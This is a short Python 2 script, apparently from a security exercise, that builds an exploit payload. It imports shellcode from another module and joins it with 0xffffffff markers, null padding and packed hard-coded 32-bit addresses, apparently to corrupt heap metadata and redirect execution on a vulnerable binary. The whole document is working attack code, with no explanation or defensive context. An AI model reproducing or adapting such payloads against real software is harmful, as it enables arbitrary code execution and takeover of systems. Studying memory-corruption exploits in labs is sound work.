from shellcode import shellcode
from struct import pack
import os,sys
print "\xff\xff\xff\xff" + shellcode + "\x00" * 13 + "\xff\xff\xff\xff" + pack("<I", 0xbffea100) + pack ("<I", 0x080f3718) + "\x00" * 8 + pack("<I", 0xbffea158) + pack("<I", 0xbffea100)
